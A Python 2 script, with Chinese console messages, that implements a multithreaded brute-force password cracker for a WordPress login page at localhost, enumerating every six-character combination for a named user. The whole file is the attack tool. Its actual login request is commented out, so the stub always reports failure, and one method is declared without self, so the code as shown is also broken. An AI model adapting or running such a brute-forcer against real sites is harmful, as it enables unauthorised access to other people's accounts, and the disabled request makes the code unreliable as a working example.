#!/usr/bin/env python
# -*- coding: utf-8 -*-

import os
import requests
import Queue
import itertools
import threading
import sys
import time


class Bruter(object):
    def __init__(self, user, character, pwd_len, threads):
        self.user = user
        self.found = False
        self.threads = threads
        print '构建待测试口令队列中...'
        self.pwd_queue = Queue.Queue()
        for pwd in list(itertools.product(character, repeat=pwd_len)):
            self.pwd_queue.put(''.join(pwd))
        self.result = None
        print '构建成功!'

    def __login(user,pwd):
        url = 'http://localhost/wordpress/wp-login.php'
        values = {'log': user, 'pwd': pwd, 'wp-submit': 'Log In',
                'redirect_to':'http://localhost/wordpress/wp-admin',
                'test_cookie':'1'
        }
        my_cookie = {'wordpress_test_cookie':'WP Cookie check'}
        # r = requests.post(url,data=values,cookies=my_cookie)
        # if r.status_code == 302:
        #    return True
        return False

    def __web_bruter(self):
        while not self.pwd_queue.empty() and not self.found:
            pwd_test = self.pwd_queue.get()
            if self.__login(pwd_test):
                self.found = True
                self.result = pwd_test
                print '破解 %s 成功，密码为: %s' % (self.user,pwd_test)
            else:
                self.found = False
                print '破解 %s 失败，密码为: %s' % (self.user,pwd_test)

    def brute(self):
        for i in range(self.threads):
            t = threading.Thread(target=self.__web_bruter)
            t.start()
            print '破解线程-->%s 启动' % t.ident
        while not self.pwd_queue.empty():
            sys.stdout.write('\r 进度: 还剩余%s个口令 (每1s刷新)' % self.pwd_queue.qsize())
            sys.stdout.flush()
            time.sleep(1)
        print '\n破解完毕'


if __name__ == "__main__":
    bruter = Bruter("pangweili", ['a', 'b', 'c', 'e', 'f'], 6, 10)
    bruter.brute()


